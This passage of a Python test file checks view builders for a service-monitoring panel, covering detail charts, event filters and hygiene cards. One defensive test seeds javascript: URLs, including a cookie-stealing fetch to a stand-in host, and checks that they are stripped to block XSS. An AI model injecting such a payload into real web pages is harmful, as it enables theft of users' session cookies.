        "api", (today - timedelta(days=1)).isoformat(), total=100, ok_count=100, p50=10.0, p95=20.0
    )
    store.add_probe_samples(
        [ProbeSample(ts=NOW_TS - 30, service="api", ok=True, status_code=200, latency_ms=12.0)]
    )
    d = view.build_service_detail(store, settings, "api", now=NOW, window_days=30)
    assert d is not None
    assert d["service"] == "api" and d["state"] == "ok"
    assert d["chart"]["mode"] == "daily"
    assert d["gran"] == "daily"
    assert d["status_codes"][0]["code"] == "200"
    assert len(d["days"]) == 30
    assert d["events"]["page"] == 1
    store.close()


def test_build_service_detail_samples_mode(tmp_path, monkeypatch):
    settings = _settings(monkeypatch)
    store = Store(str(tmp_path / "s.db"))
    store.add_probe_samples(
        [
            ProbeSample(ts=NOW_TS - 60, service="api", ok=True, status_code=200, latency_ms=11.0),
            ProbeSample(ts=NOW_TS - 30, service="api", ok=True, status_code=200, latency_ms=13.0),
        ]
    )
    d = view.build_service_detail(store, settings, "api", now=NOW, gran="samples")
    assert d is not None
    assert d["chart"]["mode"] == "samples"
    assert d["chart"]["single_d"].startswith("M")  # 逐次单线
    store.close()


def test_build_service_detail_missing_returns_none(tmp_path, monkeypatch):
    settings = _settings(monkeypatch)
    store = Store(str(tmp_path / "s.db"))
    assert view.build_service_detail(store, settings, "ghost", now=NOW) is None
    store.close()


def test_build_service_detail_related_events_and_marks(tmp_path, monkeypatch):
    settings = _settings(monkeypatch)
    store = Store(str(tmp_path / "s.db"))
    store.add_probe_samples(
        [ProbeSample(ts=NOW_TS - 30, service="api", ok=True, status_code=200, latency_ms=12.0)]
    )
    _seed_open(store, "latency_degraded", "api", ts=NOW_TS - 3600)
    _seed_open(store, "service_down", "other", ts=NOW_TS - 3600)  # 别的服务,不该出现
    # 逐日模式 x 轴跨整窗(午夜→now),1h 前的事件落在窗内可标注
    d = view.build_service_detail(store, settings, "api", now=NOW, gran="daily")
    assert d["events"]["total"] == 1
    assert d["events"]["items"][0]["rule"] == "latency_degraded"
    # latency 类事件叠到时序图 x 标记上
    assert any(m["rule"] == "latency_degraded" for m in d["marks"])
    store.close()


# —— Phase 2:事件流列表 view 单测 ——


def test_confidence_and_tool_count_helpers():
    from sentinel.findings import EventRecord
    from sentinel.panel.view import _confidence_of, _confidence_pct, _tool_count_of

    def rec(diag_json=None, tools_json=None):
        return EventRecord(
            id=1,
            ts=0,
            rule="container_down",
            subject="api",
            severity="critical",
            status="open",
            detail="d",
            payload_json="{}",
            diagnosis_status="done",
            diagnosis_json=diag_json,
            cooldown_until=0,
            resolved_ts=None,
            diagnosis_tools_json=tools_json,
        )

    assert _confidence_of(rec(json.dumps({"confidence": "High"}))) == "high"  # 归一小写
    assert _confidence_of(rec(json.dumps({"confidence": "bogus"}))) is None
    assert _confidence_of(rec(None)) is None
    assert _confidence_of(rec("not-json")) is None
    assert _tool_count_of(rec(tools_json=json.dumps([{"tool": "a"}, {"tool": "b"}]))) == 2
    assert _tool_count_of(rec(tools_json=None)) == 0
    assert _tool_count_of(rec(tools_json="bad")) == 0
    assert _confidence_pct("high") == 92 and _confidence_pct("medium") == 66
    assert _confidence_pct("low") == 38 and _confidence_pct(None) is None


def test_event_view_exposes_confidence_and_tool_count(tmp_path, monkeypatch):
    settings = _settings(monkeypatch)
    store = Store(str(tmp_path / "s.db"))
    _seed_open(
        store,
        "container_down",
        "api",
        diag={"summary": "x", "confidence": "medium"},
        tools=[{"tool": "docker_logs", "output": "o", "ok": True}],
    )
    data = view.build_events_list(store, settings, now=NOW)
    it = data["events"]["items"][0]
    assert it["confidence"] == "medium"
    assert it["tool_count"] == 1
    store.close()


def test_build_events_list_filters_and_subjects(tmp_path, monkeypatch):
    settings = _settings(monkeypatch)
    store = Store(str(tmp_path / "s.db"))
    _seed_open(store, "service_down", "api", ts=NOW_TS - 100)  # critical open
    store.insert_event(
        ts=NOW_TS - 200,
        rule="latency_degraded",
        subject="auth",
        severity="warning",
        status="open",
        detail="d",
        payload_json="{}",
        diagnosis_status="skipped",
        cooldown_until=0,
    )
    rid = store.insert_event(
        ts=NOW_TS - 300,
        rule="container_down",
        subject="api",
        severity="critical",
        status="open",
        detail="d",
        payload_json="{}",
        diagnosis_status="skipped",
        cooldown_until=0,
    )
    store.resolve_event(rid, resolved_ts=NOW_TS - 250)  # recovered
    base = view.build_events_list(store, settings, now=NOW)
    assert base["events"]["total"] == 3
    assert [s["name"] for s in base["subjects"]] == ["api", "auth"]  # distinct + 排序
    # subject=api → 2(service_down + 已恢复 container_down)
    assert view.build_events_list(store, settings, now=NOW, subject="api")["events"]["total"] == 2
    # severity=warning → 1(auth)
    sv = view.build_events_list(store, settings, now=NOW, severity="warning")
    assert sv["events"]["total"] == 1 and sv["events"]["items"][0]["subject"] == "auth"
    # status=recovered → 1(已恢复的 container_down)
    rc = view.build_events_list(store, settings, now=NOW, status="recovered")
    assert rc["events"]["total"] == 1 and rc["events"]["items"][0]["lifecycle"] == "recovered"
    # status=open → 2
    assert view.build_events_list(store, settings, now=NOW, status="open")["events"]["total"] == 2
    store.close()


def test_build_events_list_label_and_page_clamp(tmp_path, monkeypatch):
    settings = _settings(monkeypatch)
    store = Store(str(tmp_path / "s.db"))
    for i in range(20):
        store.insert_event(
            ts=NOW_TS - 100 - i,
            rule="service_down",
            subject="api",
            severity="critical",
            status="open",
            detail="d",
            payload_json="{}",
            diagnosis_status="skipped",
            cooldown_until=0,
        )
    data = view.build_events_list(
        store, settings, now=NOW, page=999, service_labels={"api": "API Gateway"}
    )
    assert data["events"]["page"] == data["events"]["total_pages"]  # 越界钳到末页
    assert data["events"]["items"][0]["label"] == "API Gateway"  # label 回填
    store.close()


# —— Phase 2:体检页 view 单测 ——


def test_local_hygiene_default_tristate(tmp_path, monkeypatch):
    settings = _settings(monkeypatch)  # backup_dir 默认非空;prometheus/cert_domains 默认空
    store = Store(str(tmp_path / "s.db"))
    cards = {c["key"]: c for c in view._local_hygiene(store, settings, tz=TZ)}
    assert cards["backup"]["state"] == "ok"  # 已配置且无 open 事件
    assert cards["disk"]["state"] == "unevaluated"  # 未接 prometheus
    assert cards["cert"]["state"] == "unevaluated"  # 未配证书域名
    store.close()


def test_local_hygiene_alert_values(tmp_path, monkeypatch):
    settings = _settings(
        monkeypatch, SENTINEL_CERT_DOMAINS="a.com", SENTINEL_PROMETHEUS_URL="http://p:9090"
    )
    store = Store(str(tmp_path / "s.db"))
    store.insert_event(
        ts=NOW_TS - 100,
        rule="cert_expiry",
        subject="a.com",
        severity="warning",
        status="open",
        detail="d",
        payload_json=json.dumps({"days_left": 3}),
        diagnosis_status="skipped",
        cooldown_until=0,
    )
    store.insert_event(
        ts=NOW_TS - 100,
        rule="disk_forecast",
        subject="/",
        severity="warning",
        status="open",
        detail="d",
        payload_json=json.dumps({"predicted_avail_bytes": 2.5e9}),
        diagnosis_status="skipped",
        cooldown_until=0,
    )
    cards = {c["key"]: c for c in view._local_hygiene(store, settings, tz=TZ)}
    assert cards["cert"]["state"] == "alert" and cards["cert"]["values"]["days_left"] == 3
    assert cards["disk"]["state"] == "alert"
    assert cards["disk"]["values"]["predicted_avail_gb"] == 2.5  # bytes → GB
    assert cards["backup"]["state"] == "ok"  # 仍健康
    store.close()


def test_local_hygiene_disk_usage_secondary(tmp_path, monkeypatch):
    settings = _settings(monkeypatch, SENTINEL_PROMETHEUS_URL="http://p:9090")
    store = Store(str(tmp_path / "s.db"))
    store.insert_event(
        ts=NOW_TS - 100,
        rule="disk_usage",
        subject="/",
        severity="critical",
        status="open",
        detail="d",
        payload_json=json.dumps({"usage_pct": 91.3}),
        diagnosis_status="skipped",
        cooldown_until=0,
    )
    disk = next(c for c in view._local_hygiene(store, settings, tz=TZ) if c["key"] == "disk")
    assert disk["state"] == "alert"  # 仅 disk_usage open(无 forecast)也 alert
    assert disk["values"]["usage_pct"] == 91.3
    store.close()


def test_upstream_deps_indicator_and_incident_filter(tmp_path, monkeypatch):
    from sentinel.models import (
        Component,
        ComponentStatus,
        Incident,
        IncidentStatus,
        Indicator,
        Snapshot,
    )

    settings = _settings(monkeypatch, SENTINEL_PROVIDERS="anthropic,openai")
    store = Store(str(tmp_path / "s.db"))
    store.put(
        "anthropic",
        Snapshot(
            provider="anthropic",
            display_name="Anthropic",
            indicator=Indicator.MAJOR,
            status_url="https://status.anthropic.com",
            components=[Component(key="api", name="API", status=ComponentStatus.PARTIAL_OUTAGE)],
            incidents=[
                Incident(
                    key="i1",
                    title="Elevated errors",
                    status=IncidentStatus.INVESTIGATING,
                    impact=Indicator.MAJOR,
                    url="https://s/i1",
                    started_at=None,
                    updated_at=None,
                    latest_update_id="u1",
                ),
                Incident(
                    key="i2",
                    title="done",
                    status=IncidentStatus.RESOLVED,
                    impact=Indicator.MINOR,
                    url="https://s/i2",
                    started_at=None,
                    updated_at=None,
                    latest_update_id="u2",
                ),
            ],
            fetched_at="2026-06-16T00:00:00Z",
        ),
    )
    deps = {d["provider"]: d for d in view._upstream_deps(store, settings)}
    assert deps["anthropic"]["state"] == "partial"  # major → partial
    assert deps["anthropic"]["components"][0]["state"] == "partial"  # partial_outage → partial
    assert len(deps["anthropic"]["incidents"]) == 1  # resolved 滤掉,仅留未结
    assert deps["openai"]["state"] == "nodata" and deps["openai"]["has_data"] is False
    store.close()


def test_upstream_deps_rejects_non_http_urls(tmp_path, monkeypatch):
    """外部 shortlink/status_url 必须经 http(s) scheme 白名单:javascript:/data: 一律抹成空。
    否则上游被投毒的 shortlink 会落进 href 成可点击 XSS(autoescape 不拦 scheme)。"""
    from sentinel.models import (
        Incident,
        IncidentStatus,
        Indicator,
        Snapshot,
    )

    settings = _settings(monkeypatch, SENTINEL_PROVIDERS="anthropic")
    store = Store(str(tmp_path / "s.db"))
    store.put(
        "anthropic",
        Snapshot(
            provider="anthropic",
            display_name="Anthropic",
            indicator=Indicator.MAJOR,
            status_url="javascript:alert(document.domain)",  # 投毒的 status_url
            components=[],
            incidents=[
                Incident(
                    key="bad",
                    title="poisoned",
                    status=IncidentStatus.INVESTIGATING,
                    impact=Indicator.MAJOR,
                    url="javascript:fetch('//x/'+document.cookie)",  # 投毒 shortlink
                    started_at=None,
                    updated_at=None,
                    latest_update_id="u1",
                ),
                Incident(
                    key="ok",
                    title="legit",
                    status=IncidentStatus.INVESTIGATING,
                    impact=Indicator.MINOR,
                    url="https://status.anthropic.com/incidents/abc",  # 合法
                    started_at=None,
                    updated_at=None,
                    latest_update_id="u2",
                ),
            ],
            fetched_at="2026-06-16T00:00:00Z",
        ),
    )
    dep = view._upstream_deps(store, settings)[0]
    assert dep["status_url"] == ""  # javascript: status_url 抹空
    by_title = {i["title"]: i for i in dep["incidents"]}
    assert by_title["poisoned"]["url"] == ""  # javascript: shortlink 抹空
    assert by_title["legit"]["url"] == "https://status.anthropic.com/incidents/abc"  # https 保留
    store.close()


async def test_build_hygiene_shape_and_banner(tmp_path, monkeypatch):
    settings = _settings(monkeypatch)
    store = Store(str(tmp_path / "s.db"))
    store.set_meta("daily_report_last_date", "2026-06-16")
    data = await view.build_hygiene(store, settings, now=NOW)
    assert set(data) >= {"banner", "local", "upstream", "posture", "host_self"}
    assert len(data["local"]) == 3
    assert data["banner"]["layers_total"] == 4
    assert data["banner"]["last_report_date"] == "2026-06-16"
    assert data["banner"]["upstream_any_data"] is False  # 无 snapshot
    store.close()
